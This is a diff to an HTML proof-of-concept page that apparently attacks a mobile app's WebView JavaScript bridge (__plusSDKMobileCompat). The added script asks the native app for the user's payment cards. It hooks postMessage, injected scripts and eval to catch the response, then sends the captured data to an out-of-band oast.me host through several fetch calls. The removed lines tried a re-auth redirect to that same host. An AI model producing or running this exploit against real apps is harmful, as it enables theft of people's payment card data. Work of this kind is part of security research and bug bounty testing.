@@ -1,20 +1,57 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-// Test: NEED_AUTHORIZATION - triggers re-auth flow
-// If this works, the app will show a login/auth screen
-// callbackUrl might redirect to attacker after auth completes
+// Test USER_CARDS_REQUEST - requests user's payment cards from native
+// The native app should respond back to the page with card data
+// We hook the incoming message to intercept the response
 
+// Hook to capture ANY response from native
+var origOnMessage = window.__plusSDKMobileCompat.onMessage;
+var captured = [];
+
+// Override - native might call evaluateJavaScript to send response back
+// The response comes as an InMessage via a different mechanism
+// Let's monitor everything
+
+// Hook postMessage on window
+window.addEventListener("message", function(e) {
+  captured.push({type:"postMessage", data:e.data, origin:e.origin});
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/response-postmsg?" + encodeURIComponent(JSON.stringify(e.data)));
+});
+
+// Monitor document for script injections (native uses evaluateJavaScript)
+var obs = new MutationObserver(function(mutations) {
+  mutations.forEach(function(m) {
+    m.addedNodes.forEach(function(n) {
+      if (n.tagName === 'SCRIPT') {
+        captured.push({type:"injected-script", src:n.src, text:n.textContent&&n.textContent.substring(0,500)});
+        fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/response-script?" + encodeURIComponent(n.src||n.textContent.substring(0,500)));
+      }
+    });
+  });
+});
+obs.observe(document.documentElement, {childList:true, subtree:true});
+
+// Hook eval
+var origEval = window.eval;
+window.eval = function(code) {
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/response-eval?" + encodeURIComponent(String(code).substring(0,500)));
+  return origEval.call(window, code);
+};
+
+// Now send USER_CARDS_REQUEST
 window.__plusSDKMobileCompat.onMessage(JSON.stringify({
-  type: "NEED_AUTHORIZATION",
-  trackId: "auth1",
-  payload: {
-    reason: "SESSION_EXPIRED",
-    callbackUrl: "https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/auth-callback"
-  }
+  type: "USER_CARDS_REQUEST",
+  trackId: "cards1",
+  payload: {}
 }));
 
-fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/need-auth-sent");
+fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/user-cards-sent");
+
+// Wait and report what we captured
+setTimeout(function(){
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/cards-captured?" + encodeURIComponent(JSON.stringify(captured)));
+}, 5000);
 </script>
 </body>
 </html>
